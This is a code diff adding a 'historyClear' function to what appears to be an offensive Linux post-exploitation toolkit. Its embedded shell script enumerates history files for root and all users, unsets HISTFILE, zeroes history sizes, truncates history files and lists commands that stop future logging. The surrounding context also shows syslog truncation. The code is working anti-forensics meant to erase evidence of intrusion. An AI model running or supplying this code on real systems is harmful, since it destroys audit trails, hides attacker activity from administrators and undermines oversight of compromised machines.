@@ -69,3 +69,66 @@ echo "  echo '' | tee /var/log/syslog  (truncate)"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function historyClear(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== History Clearing ==="]
+
+  const script = `
+echo "--- Current History Files ---"
+for dir in /root /home/*; do
+  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history" ".node_repl_history" ".mysql_history" ".psql_history"; do
+    if [ -f "$dir/$hf" ]; then
+      lines=$(wc -l < "$dir/$hf" 2>/dev/null)
+      echo "[*] $dir/$hf: $lines lines"
+    fi
+  done
+done
+
+echo ""
+echo "--- History Environment ---"
+echo "HISTFILE=${HISTFILE:-not set}"
+echo "HISTSIZE=${HISTSIZE:-not set}"
+echo "HISTFILESIZE=${HISTFILESIZE:-not set}"
+echo "HISTCONTROL=${HISTCONTROL:-not set}"
+
+echo ""
+echo "--- Clearing History ---"
+unset HISTFILE
+export HISTSIZE=0
+export HISTFILESIZE=0
+history -c 2>/dev/null
+for dir in /root /home/*; do
+  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history"; do
+    if [ -f "$dir/$hf" ] && [ -w "$dir/$hf" ]; then
+      > "$dir/$hf" 2>/dev/null && echo "[+] Cleared $dir/$hf"
+    fi
+  done
+done
+
+echo ""
+echo "--- Prevent Future Logging ---"
+echo "Run these in your shell session:"
+echo "  unset HISTFILE"
+echo "  export HISTSIZE=0"
+echo "  set +o history"
+echo "  Or prefix commands with a space (if HISTCONTROL=ignorespace)"
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  const cleared = (r.stdout.match(/Cleared/g) || []).length
+  findings.push({
+    checkId: "LNX-HISTCLR-001",
+    provider: "linuxhook",
+    severity: "MEDIUM",
+    status: cleared > 0 ? "EXPLOITED" : "IDENTIFIED",
+    resource: "shell_history",
+    title: cleared > 0 ? `Shell history cleared (${cleared} files)` : "Shell history files enumerated",
+    details: cleared > 0 ? `${cleared} history file(s) cleared. HISTFILE unset, HISTSIZE=0 for current session` : "History files found — clear before exiting",
+    remediation: "Forward command history to a centralized audit system. Use auditd for command logging.",
+  })
+
+  return { output: output.join("\n"), findings }
+}
